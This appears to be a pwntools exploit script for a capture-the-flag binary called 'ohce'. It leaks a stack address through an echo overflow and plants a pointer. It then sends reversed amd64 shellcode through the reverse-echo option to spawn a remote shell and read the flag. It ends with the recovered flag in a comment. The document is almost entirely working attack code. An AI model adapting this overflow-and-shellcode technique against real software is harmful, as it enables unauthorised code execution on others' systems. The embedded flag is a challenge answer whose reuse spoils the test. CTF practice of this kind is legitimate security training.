#!/usr/bin/env python2

from pwn import *

###

if len(sys.argv) > 1:
    DEBUG = False
else:
    DEBUG = True

context.arch = 'amd64'
context.os = 'linux'
context.bits = 64
context.log_level = 'info'

###

if DEBUG:
    r = process('./ohce')
    #r = remote('127.0.0.1', 4242)
else:
    r = remote('13.124.134.94', 8889)

GDB = False
if GDB and DEBUG:
    gdb.attach(r)

def echo(msg):
    global r
    r.sendline('1')
    r.sendline(msg)

def echorev(msg):
    global r
    r.sendline('2')
    r.sendline(msg)

r.recvuntil('>')

GDB = False
if GDB and DEBUG:
    gdb.attach(r, '''b *0x400171
    b *0x400176
    b *0x40018b''')

# leak stack
echo('A' * 0x1f)
r.recvuntil('A' * 0x1f + '\n')
leak = u64(r.recv(6) + '\x00' * 2)
log.info('leak: %#x' % leak)

# place pointer to future shellcode into stack
log.info('placing shellcode pointer into stack')
echo(p64(leak - 0x40) + 'A' * 0x60)

# trigger shellcode execution
p  = p64(leak - 0x98)[0:6][::-1]
p += asm(shellcraft.sh())[::-1]
p += 'A' * (0x3f - len(p))

log.info('putting shellcode into stack and triggering')
echorev(p)
log.info('flushing output')
time.sleep(1)
r.clean()

r.sendline('cat flag')
r.interactive()
r.close()

# SECU[the_true_world_and_1n_here_1s_the_dream]
